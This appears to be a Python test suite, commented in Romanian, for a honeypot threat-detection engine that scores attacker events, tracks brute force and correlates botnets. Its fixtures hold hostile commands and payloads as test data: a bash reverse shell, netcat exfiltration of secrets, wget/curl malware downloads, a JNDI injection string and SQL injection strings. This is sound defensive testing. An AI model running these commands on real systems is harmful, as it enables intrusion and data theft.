# Ruleaza din folderul threat-engine:  python test_filters.py
# Fiecare test verifica o regula. Daca ceva s-a stricat, vezi exact care.

import os
import random
import re
import sqlite3
import tempfile
from datetime import datetime, timedelta, timezone

from filters import (check_event, command_words, is_internal, build_alert, alert_view, describe,
                     BruteForceTracker, HONEYTOKENS, COMMAND_PATTERNS, COMMAND_WORDS, HTTP_RULES)
from events import validate_event
from engine import Engine
from storage import SqliteStorage, MemoryStorage
from scoring import score_to_severity
from sessions import group_sessions, session_summary, STAGES
from recommendations import DEFAULT_RECOMMENDATION
from stats import LiveStats
from profiles import attacker_profile
from correlation import correlate, jaccard, gather_indicators, UnionFind
from clustering import cluster, behavior_signature
from blocklist import build_blocklist, dangerous_ips
from attack_techniques import technique_for, navigator_layer
from texts import RULE_LABELS, present_stages, present_campaign, present_family

HERE = os.path.dirname(os.path.abspath(__file__))


def command(text, url=""):
    return {"event_type": "command_exec", "source_ip": "1.2.3.4",
            "payload_details": {"command": text, "extracted_url": url}}


def http(path):
    return {"event_type": "http_request", "source_ip": "1.2.3.4",
            "payload_details": {"http_path": path}}


def login(user, password, success, second, ip="1.2.3.4", session="s1"):
    return {"event_type": "login_attempt", "source_ip": ip, "session_id": session,
            "timestamp": f"2026-11-17T10:00:{second:02d}.000Z",
            "credentials": {"username": user, "password": password, "success": success}}


def score(event, tracker=None):
    return check_event(event, tracker)[1]


def severity(event, tracker=None):
    return score_to_severity(check_event(event, tracker)[1])


def reason(event, tracker=None):
    """Textul alertei, asa cum il vede dashboard-ul."""
    verdict = check_event(event, tracker)
    return describe(verdict.rule, verdict.details, event)


def full(event_type="login_attempt", ip="45.155.205.233", when=None, **fields):
    """Un eveniment complet, ca de la agent (trece de validare)."""
    when = when or datetime(2026, 11, 17, 10, 0, tzinfo=timezone.utc)
    event = {"timestamp": when.strftime("%Y-%m-%dT%H:%M:%S.") + f"{when.microsecond // 1000:03d}Z",
             "node_id": "gateway", "event_type": event_type, "source_ip": ip,
             "source_port": 40000, "target_port": 22, "protocol": "SSH", "session_id": "sess-" + ip}
    event.update(fields)
    return event


def failed_login(ip, n, when):
    return full(ip=ip, when=when, credentials={"username": "root", "password": f"p{n}", "success": False})


# --- scorul: severitatea iese din puncte, nu e fixa ------------------------

def test_score_bands():
    assert score_to_severity(0) == "NONE"
    assert score_to_severity(5) == "LOW"
    assert score_to_severity(15) == "MEDIUM"
    assert score_to_severity(30) == "HIGH"
    assert score_to_severity(50) == "CRITICAL"


def test_command_words():
    assert command_words("cd /tmp; /bin/busybox wget x") == ["cd", "tmp", "busybox", "wget", "x"]


def test_id_is_a_whole_word():
    assert score(command("cat android.txt")) == 0          # "android" contine "id", dar nu e cuvant
    assert score(command("whoami && id")) == 6             # recunoscut, dar doar recunoastere = putine puncte


def test_download_is_serious():
    assert score(command("wget http://x/bot", "http://x/bot")) == 40
    assert severity(command("wget http://x/bot", "http://x/bot")) == "HIGH"


def test_mirai_probes():
    assert score(command("/bin/busybox ECCHI")) == 8
    assert score(command("echo -e '\\x6b\\x61\\x6d\\x69'")) == 10


def test_persistence_and_cleanup():
    assert severity(command("echo k >> ~/.ssh/authorized_keys")) == "CRITICAL"
    assert score(command("rm -rf /var/log/*")) == 30


def test_http_rules():
    assert severity(http("/index.php?id=1%27%20OR%20%271%27=%271")) == "HIGH"
    assert severity(http("/?x=${jndi:ldap://1.2.3.4/a}")) == "CRITICAL"
    assert score(http("/%252e%252e/etc/passwd")) == 15     # decodat de doua ori
    assert score(http("/")) == 0


def test_internal_ip():
    assert is_internal({"source_ip": "192.168.1.20"}) is True
    assert is_internal({"source_ip": "8.8.8.8"}) is False
    assert is_internal({"source_ip": None}) is False        # nu mai arunca exceptie


def test_successful_login():
    assert severity(login("root", "root", True, 0)) == "CRITICAL"


def test_brute_force_scales_with_attempts():
    tracker = BruteForceTracker()
    scores = []
    for second in range(10):
        scores.append(score(login("root", f"p{second}", False, second), tracker))
    # prima incercare pe root = 8; a 5-a declanseaza brute force = 20 + 5 = 25; restul tac
    assert scores == [8, 0, 0, 0, 25, 0, 0, 0, 0, 0]


def test_session_stages():
    events = [
        login("root", "x", False, 0),
        login("root", "root", True, 1),
        command("cd /tmp; wget http://x/bot", "http://x/bot"),
        command("echo '* * * * * /tmp/bot' | crontab -"),
    ]
    for second, event in enumerate(events):
        event["session_id"] = "s1"
        event["timestamp"] = f"2026-11-17T10:00:{second:02d}.000Z"
    summary = session_summary("s1", group_sessions(events)["s1"])
    assert summary["stages"] == ["connect", "login_attempt", "login_success", "commands", "download", "persistence"]
    assert summary["successful_login"] == "root:root"
    assert summary["passwords"] == ["x", "root"]


def test_every_rule_has_a_recommendation():
    events = [
        command("wget http://x/bot", "http://x/bot"), command("bash -i >& /dev/tcp/1.2.3.4/1 0>&1"),
        command("echo k >> ~/.ssh/authorized_keys"), command("rm -rf /var/log/*"),
        command("cat /etc/shadow"), command("chmod +x bot"), command("/bin/busybox ECCHI"),
        command("uname -a"), command("crontab -l"), command("python -c 'x'"),
        http("/?x=${jndi:ldap://a/b}"), http("/?id=1' or '1'='1"), http("/.env"), http("/../../x"),
        http("/?cmd=ls"), http("/?q=<script>"), login("root", "root", True, 0),
    ]
    for event in events:
        verdict = check_event(event)
        alert = alert_view(build_alert(event, verdict), event)
        assert alert["recommendation"] != DEFAULT_RECOMMENDATION, verdict.rule
        assert alert["severity"] == score_to_severity(verdict.score)


def test_behavior_builds_the_profile_score():
    # un bot care doar scaneaza aduna putine puncte; unul care intra + descarca + persistenta, multe
    scanner = [{"source_ip": "1.1.1.1", "severity": "LOW", "score": 6, "protocol": "HTTP"}]
    full_attack = [{"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"},
                   {"source_ip": "2.2.2.2", "severity": "HIGH", "score": 40, "protocol": "SSH"},
                   {"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"}]
    p_scan = attacker_profile("1.1.1.1", [], scanner, 1)
    p_full = attacker_profile("2.2.2.2", [], full_attack, 3)
    assert p_scan["threat_score"] == 6 and p_scan["overall_severity"] == "LOW"
    assert p_full["threat_score"] == 130 and p_full["overall_severity"] == "CRITICAL"


def test_stats_count_everything():
    stats = LiveStats()
    stats.add_event(login("root", "123", False, 0))
    stats.add_event(login("root", "123", False, 1))
    stats.add_alert({"severity": "HIGH", "protocol": "ssh", "source_ip": "1.2.3.4"})
    data = stats.to_dict()
    assert data["total_events"] == 2
    assert data["top_credentials"] == [{"credentials": "root:123", "count": 2}]
    assert data["alerts_by_protocol"] == {"SSH": 1}


def test_correlation_recovers_a_botnet():
    # 3 IP-uri diferite descarca de pe ACELASI server -> o singura campanie
    summaries = []
    for n in range(3):
        summaries.append({"source_ip": f"9.9.9.{n}", "downloads": ["http://evil.example/bins/m.arm7"],
                          "passwords": ["admin"]})
    # un IP fara legatura cu ceilalti
    summaries.append({"source_ip": "5.5.5.5", "downloads": ["http://alt.example/x"], "passwords": ["parola"]})
    campaigns = correlate(summaries)
    assert len(campaigns) == 1
    assert campaigns[0]["ips"] == ["9.9.9.0", "9.9.9.1", "9.9.9.2"]
    assert campaigns[0]["reason_codes"] == ["same_server"]
    assert jaccard({"a", "b"}, {"a", "b"}) == 1.0


def test_attack_technique_tagging():
    assert technique_for("brute_force")[0] == "T1110"
    assert technique_for("login_success")[0] == "T1078"
    assert technique_for("download_attempt")[0] == "T1105"
    assert technique_for("ceva necunoscut") is None
    # layer-ul pentru Navigator numara tehnicile
    alerts = [{"technique": "T1078", "technique_name": "Valid Accounts"}] * 2
    layer = navigator_layer(alerts)
    assert layer["techniques"][0] == {"techniqueID": "T1078", "score": 2, "comment": "Valid Accounts"}


def test_clustering_groups_similar_behavior():
    # 2 boti IoT care se poarta la fel (telnet + busybox + descarcare) -> o familie
    def iot(ip):
        return {"source_ip": ip, "protocol": "TELNET",
                "commands": ["/bin/busybox ECCHI", "wget http://x/m.arm7"],
                "stages": ["connect", "login_success", "commands", "download"]}
    scanner = {"source_ip": "7.7.7.7", "protocol": "HTTP", "commands": [], "stages": ["connect"]}
    families = cluster([iot("1.1.1.1"), iot("2.2.2.2"), scanner])
    assert len(families) == 1
    assert families[0]["ips"] == ["1.1.1.1", "2.2.2.2"]
    assert families[0]["code"] == "iot_botnet"
    assert present_family(families[0])["label"] == "botnet IoT (tip Mirai)"


def http_login(path, user, password, ip="1.2.3.4", second=0):
    event = login(user, password, False, second, ip)
    event["protocol"] = "HTTP"
    event["payload_details"] = {"http_path": path}
    return event


def test_http_login_also_checks_the_path():
    # parola din URL nu mai ascunde exploit-ul din cale: se pastreaza scorul mai mare
    event = http_login("/login.cgi?user=admin;wget+http://203.0.113.5/x", "admin", "admin")
    assert score(event, BruteForceTracker()) == 30
    assert check_event(event).rule == "web_command_injection"
    assert "ruleze comenzi" in reason(event)
    assert severity(http_login("/?x=${jndi:ldap://a/b}", "admin", "x")) == "CRITICAL"
    # fara exploit in cale ramane regula de login
    assert score(http_login("/login.cgi?user=admin", "admin", "x")) == 8
    # pe SSH nu exista cale
    assert score(login("admin", "x", False, 0)) == 8


def test_command_injection_in_url():
    assert score(http("/cgi-bin/;wget%20http://203.0.113.5/x.sh")) == 30
    assert score(http("/shell?cd+/tmp;curl+-O+http://203.0.113.5/x")) == 30


def test_honeytoken_file_read():
    assert severity(command("cat /etc/hostapd.conf")) == "MEDIUM"
    assert severity(command("cd /etc/ppp; cat chap-secrets")) == "MEDIUM"   # doar numele, fara cale
    assert check_event(command("grep wpa /etc/hostapd.conf")).rule == "honeytoken_read"
    assert "fisier-momeala" in reason(command("grep wpa /etc/hostapd.conf"))
    # nu se pierde in spatele unei reguli mai slabe...
    assert score(command("uname -a; cat /etc/hostapd.conf")) == 20
    # ...dar nici nu acopera una mai grava (exfiltrare cu netcat)
    assert score(command("cat /etc/ppp/chap-secrets | nc 203.0.113.5 80")) == 30


def test_honeytoken_login_beats_brute_force():
    tracker = BruteForceTracker()
    scores = []
    for second in range(3):
        scores.append(score(login("root", f"p{second}", False, second), tracker))
    # parola Wi-Fi in mijlocul unui brute force: nu se pierde printre parolele gresite
    scores.append(score(login("root", "w7Kq2mVx9pLz", False, 3), tracker))
    scores.append(score(login("root", "p4", False, 4), tracker))
    # dar s-a numarat ca parola gresita: a 5-a greseala declanseaza brute force
    assert scores == [8, 0, 0, 50, 25]
    assert severity(login("2210417553", "x", False, 0)) == "CRITICAL"            # userul PPPoE
    assert severity(login("admin", '"Rp4tHx92kQ"', False, 0)) == "CRITICAL"      # copiat cu ghilimele
    assert severity(http_login("/login.cgi", "W7KQ2MVX9PLZ", "x")) == "NONE"    # alt text, nu e secretul
    text = reason(login("admin", "w7Kq2mVx9pLz", False, 0))
    assert "hostapd.conf" in text        # dashboard-ul o marcheaza HONEYTOKEN dupa numele fisierului


def test_honeytoken_alerts_are_tagged():
    read = command("cat /etc/hostapd.conf")
    read = alert_view(build_alert(read, check_event(read)), read)
    used = login("admin", "Rp4tHx92kQ", False, 0)
    used = alert_view(build_alert(used, check_event(used)), used)
    assert read["technique"] == "T1552.001" and used["technique"] == "T1078"
    assert read["recommendation"] != DEFAULT_RECOMMENDATION
    assert used["recommendation"] != DEFAULT_RECOMMENDATION


def test_correlation_links_honeytoken_reader_and_user():
    reader = {"source_ip": "9.9.9.1", "commands": ["cat /etc/ppp/chap-secrets"], "passwords": ["admin"]}
    user = {"source_ip": "8.8.8.2", "commands": [], "passwords": ["x"], "usernames": ["2210417553"]}
    other = {"source_ip": "7.7.7.3", "commands": ["cat /etc/hostapd.conf"], "passwords": []}
    campaigns = correlate([reader, user, other])
    assert len(campaigns) == 1
    assert campaigns[0]["ips"] == ["8.8.8.2", "9.9.9.1"]
    assert campaigns[0]["reason_codes"] == ["honeytoken_passed_on"]
    assert present_campaign(campaigns[0])["reasons"] == ["un IP a citit fisierul-momeala, altul i-a folosit secretul"]


def test_session_keeps_usernames():
    events = [login("2210417553", "x", False, 0), login("admin", "y", False, 1)]
    summary = session_summary("s1", group_sessions(events)["s1"])
    assert summary["usernames"] == ["2210417553", "admin"]


def test_honeytokens_match_the_agent():
    # aceleasi secrete ca in agent (fs.go). In containerul threat-engine fisierul Go nu exista.
    path = os.path.join(HERE, "..", "honeypot-agent", "internal", "vfs", "fs.go")
    if not os.path.exists(path):
        return
    with open(path, encoding="utf-8") as f:
        source = f.read()
    in_go = re.findall(r'(?:wifiPassphrase|pppoeUser|pppoePassword)\s*=\s*"([^"]*)"', source)
    in_python = [token[0] for token in HONEYTOKENS]
    assert sorted(in_go) == sorted(in_python), f"fs.go are {in_go}, filters.py are {in_python}"


def test_blocklist_filters_by_score():
    alerts = [
        {"source_ip": "1.1.1.1", "score": 45},   # grav -> intra
        {"source_ip": "2.2.2.2", "score": 6},    # usor -> nu intra
        {"source_ip": "1.1.1.1", "score": 40},   # acelasi IP, se aduna
    ]
    chosen = dangerous_ips(alerts, min_score=25)
    assert chosen == [("1.1.1.1", 85)]
    assert "1.1.1.1" in build_blocklist(alerts, "nftables")
    assert "2.2.2.2" not in build_blocklist(alerts)


# --- pregatit pentru baza de date: cele 8 probleme, intr-un singur test ----

class BrokenStorage(MemoryStorage):
    """Ca un disc plin: orice salvare pica."""

    def save(self, events, alerts, rejected=()):
        raise OSError("disc plin")


def random_summaries(seed, count):
    """Sesiuni la intamplare: parole dintr-un dictionar mic, servere, fisiere-momeala."""
    rng = random.Random(seed)
    passwords = [f"p{n}" for n in range(12)]
    summaries = []
    for n in range(count):
        downloads = []
        if rng.random() < 0.15:
            downloads.append(f"http://srv{rng.randrange(25)}.example/x")
        if rng.random() < 0.05:
            downloads.append(f"1.2.3.4/bin{rng.randrange(10)}")          # fara server in adresa
        commands = rng.sample(["uname -a", "/bin/busybox X", "wget a", "crontab -l", "cat /etc/hostapd.conf",
                               "cat chap-secrets", "bash -i"], rng.randint(0, 3))
        usernames = ["root"] + (["2210417553"] if rng.random() < 0.03 else [])
        summaries.append({"source_ip": f"10.0.{n // 256}.{n % 256}",
                          "protocol": rng.choice(["SSH", "TELNET", "HTTP"]),
                          "passwords": rng.sample(passwords, rng.randint(1, 6)), "usernames": usernames,
                          "commands": commands, "downloads": downloads,
                          "stages": STAGES[:rng.randint(1, 5)]})
    return summaries


def groups_from_pairs(ips, linked):
    """Grupurile, comparand fiecare pereche (incet, dar sigur corect)."""
    groups = UnionFind(ips)
    for i in range(len(ips)):
        for j in range(i + 1, len(ips)):
            if linked(ips[i], ips[j]):
                groups.union(ips[i], ips[j])
    return sorted(sorted(g) for g in groups.groups().values() if len(g) >= 2)


def test_ready_for_the_database():
    now = datetime.now(timezone.utc)
    attacker = "91.240.118.172"
    attack = [failed_login(attacker, n, now + timedelta(seconds=n)) for n in range(4)]
    download = full(event_type="command_exec", when=now, payload_details={
        "command": "wget http://x/a", "extracted_url": "http://x/a", "raw_data": "x" * 5000})
    lab = full(ip="192.168.1.50", when=now, credentials={"username": "root", "password": "root", "success": True})
    storage = MemoryStorage()
    engine = Engine(storage, include_internal=False)

    # 2. un eveniment stricat e pus deoparte (cu motivul), restul lotului intra
    result = engine.ingest(attack + [download, lab, {**download, "source_ip": None}, "text"])
    assert result["accepted"] == 6 and result["rejected"] == 2
    assert [r["reason"] for r in storage.rejected] == ["missing:source_ip", "not_object"]
    assert validate_event({**download, "source_port": "22"})[1] == "bad:source_port"

    # 1. fiecare eveniment are event_id (al agentului sau din continut); un lot retrimis nu se dubleaza
    assert all(len(e["event_id"]) == 32 for e in storage.events)
    assert validate_event({**download, "event_id": "abc123"})[0]["event_id"] == "abc123"
    assert engine.ingest(attack)["duplicates"] == 4
    assert len(storage.events) == 6 and engine.stats.total_events == 5

    # 3. alerta salvata are id-ul ei + event_id, fara copia evenimentului; dashboard-ul primeste tot
    saved = next(a for a in storage.alerts if a["rule"] == "download_attempt")
    assert "payload_details" not in saved and len(saved["alert_id"]) == 32
    shown = next(a for a in engine.recent_alerts if a["alert_id"] == saved["alert_id"])
    assert shown["payload_details"]["raw_data"] == "x" * 5000
    assert shown["alert_reason"] == "incercare de descarcare: http://x/a" and shown["technique"] == "T1105"

    # 4. in date: coduri; textele (pe care le compara dashboard-ul) se fac la afisare
    assert engine.summaries()[0]["stages"][0] == "connect"
    assert present_stages({"stages": ["connect", "persistence"]})["stages"] == ["conectare", "persistenta"]
    assert present_family({"code": "web_scanner", "common_behavior": []})["label"] == "scanner web"
    for table in (COMMAND_PATTERNS, COMMAND_WORDS, HTTP_RULES):
        assert all(rule in RULE_LABELS for _, _, rule in table)
    trick = command("uname; echo brute-force fisier-momeala")      # textul atacatorului nu schimba tehnica
    assert alert_view(build_alert(trick, check_event(trick)), trick)["technique"] == "T1082"

    # 8. traficul intern e salvat si judecat, dar ascuns la citire (INCLUDE_INTERNAL=false)
    assert any(a["source_ip"] == "192.168.1.50" for a in storage.alerts)
    assert all(a["source_ip"] != "192.168.1.50" for a in engine.recent_alerts)

    # 6 + 7. repornire (alt engine, aceleasi date): se reface tot, si brute force-ul nu porneste de la 0
    restarted = Engine(storage, include_internal=True)
    restarted.load()
    assert restarted.stats.total_alerts == len(storage.alerts) == 3
    assert restarted.ingest(attack)["duplicates"] == 4
    fifth = restarted.ingest([failed_login(attacker, 5, now + timedelta(seconds=5))])
    assert [a["rule"] for a in fifth["new_alerts"]] == ["brute_force"]

    # 2. daca salvarea pica, nu se schimba nimic in RAM; agentul retrimite si totul se face o data
    broken = Engine(BrokenStorage())
    try:
        broken.ingest(attack)
        assert False, "trebuia sa arunce OSError"
    except OSError:
        pass
    assert broken.stats.total_events == 0 and broken.tracker.failures == {} and not broken.seen.ids

    # 5. corelarea si clustering-ul nu mai compara toate perechile, dar gasesc aceleasi grupuri
    summaries = random_summaries(1, 300)
    found = gather_indicators(summaries)

    def linked(a, b):
        x, y = found[a], found[b]
        return bool((x["read"] & y["used"]) or (y["read"] & x["used"]) or (x["used"] & y["used"])
                    or (x["servers"] & y["servers"]) or (x["malware"] & y["malware"])
                    or (len(x["passwords"]) >= 3 and len(y["passwords"]) >= 3
                        and jaccard(x["passwords"], y["passwords"]) >= 0.6))

    assert sorted(c["ips"] for c in correlate(summaries)) == groups_from_pairs(list(found), linked)
    signatures = behavior_signature(summaries)
    assert sorted(f["ips"] for f in cluster(summaries)) == groups_from_pairs(
        list(signatures), lambda a, b: jaccard(signatures[a], signatures[b]) >= 0.5)
    assert restarted.campaigns() is restarted.campaigns()   # si rezultatul sta in cache


# --- baza de date (SQLite) ------------------------------------------------

def count(storage, table):
    return storage.conn.execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0]


def lines(path):
    with open(path, encoding="utf-8") as f:
        return [line for line in f if line.strip()]


def test_sqlite_storage():
    now = datetime(2026, 11, 27, 9, 0, tzinfo=timezone.utc)
    attacker = "91.240.118.172"
    attack = [failed_login(attacker, n, now + timedelta(seconds=n)) for n in range(5)]
    tricky = full(event_type="command_exec", when=now, event_id="abc123", payload_details={
        "command": "echo '; DROP TABLE events; -- \u0000 ăîșț \U0001F600", "extracted_url": "http://x/a"})
    other_format = full(event_type="session_start", ip="5.6.7.8", timestamp="2026-11-27T11:00:00+02:00")

    with tempfile.TemporaryDirectory() as folder:
        db = os.path.join(folder, "honeypot.db")
        journal = os.path.join(folder, "received_events.jsonl")
        rejected = os.path.join(folder, "rejected_events.jsonl")
        storage = SqliteStorage(db, journal, rejected)
        try:
            # setarile din CLAUDE.md: WAL, fara fisiere temporare, asteapta cand baza e ocupata, chei straine
            settings = [storage.conn.execute(f"PRAGMA {name}").fetchone()[0]
                        for name in ("journal_mode", "temp_store", "busy_timeout", "foreign_keys")]
            assert settings == ["wal", 2, 5000, 1]

            # un lot: evenimentele + alertele in baza, evenimentele si in jurnal, respinsul doar in fisier
            engine = Engine(storage)
            result = engine.ingest(attack + [tricky, other_format, {**tricky, "source_ip": None}])
            assert result["accepted"] == 7 and result["rejected"] == 1
            assert count(storage, "events") == 7 and len(lines(journal)) == 7 and len(lines(rejected)) == 1
            assert count(storage, "alerts") == result["alerts_generated"] == 3   # cont critic, brute force, wget

            # ce iese din baza e exact ce a intrat, in aceeasi ordine (cu tot cu ' -- NUL, diacritice, emoji)
            saved = list(storage.iter_events())
            assert [e["event_id"] for e in saved] == [e["event_id"] for e in storage_order(attack, tricky, other_format)]
            assert saved[5]["payload_details"]["command"] == tricky["payload_details"]["command"]
            assert [a["rule"] for a in storage.iter_alerts()] == ["critical_user_login", "brute_force",
                                                                  "download_attempt"]

            # timestamp-ul din coloana e mereu UTC, ca la agent (altfel ORDER BY ar amesteca formatele)
            times = dict(storage.conn.execute("SELECT event_id, timestamp FROM events"))
            assert times[saved[6]["event_id"]] == "2026-11-27T09:00:00.000Z"
            assert times["abc123"] == "2026-11-27T09:00:00.000Z"

            # acelasi lot de la un engine nou (fara id-urile in RAM): baza il refuza singura, fara eroare
            Engine(storage).ingest(attack + [tricky])
            assert count(storage, "events") == 7 and count(storage, "alerts") == 3

            # totul sau nimic: daca o alerta nu se poate scrie, nici evenimentele lotului nu raman
            fresh = full(ip="9.9.9.9", when=now)
            fresh["event_id"] = "fresh1"
            for bad_alert in ({"alert_id": "x", "event_id": "fresh1", "timestamp": fresh["timestamp"],
                               "source_ip": "9.9.9.9", "rule": None, "score": 1, "severity": "LOW"},
                              {"alert_id": "y", "event_id": "nu-exista", "timestamp": fresh["timestamp"],
                               "source_ip": "9.9.9.9", "rule": "port_probe", "score": 1, "severity": "LOW"}):
                try:
                    storage.save([fresh], [bad_alert])
                    assert False, "trebuia sa arunce sqlite3.IntegrityError"
                except sqlite3.IntegrityError:
                    pass
                assert count(storage, "events") == 7 and count(storage, "alerts") == 3
            # ...dar jurnalul le are (scris primul): la refacerea bazei, event_id arunca dublurile
            assert len(lines(journal)) == 7 + 6 + 2
        finally:
            storage.close()

        # repornire: alta conexiune la acelasi fisier -> engine-ul reface aceleasi statistici si alerte
        storage = SqliteStorage(db, journal, rejected)
        try:
            restarted = Engine(storage)
            assert restarted.load() == {"events": 7, "alerts": 3, "skipped": 0}
            assert restarted.stats.to_dict() == engine.stats.to_dict()
            assert [a["alert_id"] for a in restarted.recent_alerts] == [a["alert_id"] for a in engine.recent_alerts]
            assert restarted.ingest(attack)["duplicates"] == 5
        finally:
            storage.close()


def storage_order(attack, tricky, other_format):
    """Ordinea in care engine-ul le-a salvat, cu event_id-urile date de validare."""
    return [validate_event(e)[0] for e in attack + [tricky, other_format]]


if __name__ == "__main__":
    tests = [
        test_score_bands, test_command_words, test_id_is_a_whole_word, test_download_is_serious,
        test_mirai_probes, test_persistence_and_cleanup, test_http_rules, test_internal_ip,
        test_successful_login, test_brute_force_scales_with_attempts, test_session_stages,
        test_every_rule_has_a_recommendation, test_behavior_builds_the_profile_score,
        test_stats_count_everything, test_correlation_recovers_a_botnet,
        test_attack_technique_tagging, test_clustering_groups_similar_behavior,
        test_blocklist_filters_by_score, test_http_login_also_checks_the_path,
        test_command_injection_in_url, test_honeytoken_file_read, test_honeytoken_login_beats_brute_force,
        test_honeytoken_alerts_are_tagged, test_correlation_links_honeytoken_reader_and_user,
        test_session_keeps_usernames, test_honeytokens_match_the_agent, test_ready_for_the_database,
        test_sqlite_storage,
    ]
    for test in tests:
        test()
        print(f"OK  {test.__name__}")
    print(f"\nToate cele {len(tests)} teste au trecut.")
